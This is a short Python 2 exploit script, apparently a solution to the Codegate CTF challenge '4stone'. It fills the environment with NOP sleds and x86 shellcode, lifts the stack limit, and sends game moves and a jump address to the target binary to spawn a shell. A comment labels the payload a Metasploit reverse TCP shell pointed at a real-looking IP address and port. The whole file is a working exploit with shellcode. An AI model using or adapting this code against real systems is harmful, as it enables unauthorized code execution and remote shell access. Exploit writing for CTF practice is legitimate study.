#!/usr/bin/env python2
#-*- coding:utf-8 -*-
import subprocess
#import zio
import collections
import os
#import resource

command = "ulimit -s unlimited; /root/codegate/4stone "
#command = "/root/codegate/4stone"
where_to_modify = "55792710"
command += where_to_modify
steps = "\n\nll\nl\nh\nh\n" + "\n"

# linux/x86/shell/reverse_tcp
# VERBOSE=false, LHOST=182.92.15.17, LPORT=4444,
buf =  ""
buf += "\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8"
buf += "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
buf += "\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
shellcode = buf
#sc_addr = 0xffbb554f
sc_addr = "08049919" + "\n"
#steps = steps + zio.l32(sc_addr) + "\n"
#steps += "%08x\n" % (sc_addr)

envir = collections.OrderedDict()
for i in range(0,100):
    envir[str(i)] = "\x90"*100 + shellcode
#for i in xrange(ord('A'), ord('z')):
#    envir["\xeb\x02" + chr(i)] = shellcode

for k, v in enumerate(os.environ):
    envir[v] = os.environ[v]

#def setlimits():
#    # Set maximum CPU time to 1 second in child process, after fork() but before exec()
#    print "Setting resource limit in child (pid %d)" % os.getpid()
#    resource.setrlimit(resource.RLIMIT_CPU, (1, 1))

#io = subprocess.Popen([command, where_to_modify], preexec_fn=setlimits, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=envir)
io = subprocess.Popen(command,shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=envir)
#io.communicate(steps)
#io.communicate(zio.l32(sc_addr) + "\n")
io.communicate(steps + sc_addr)
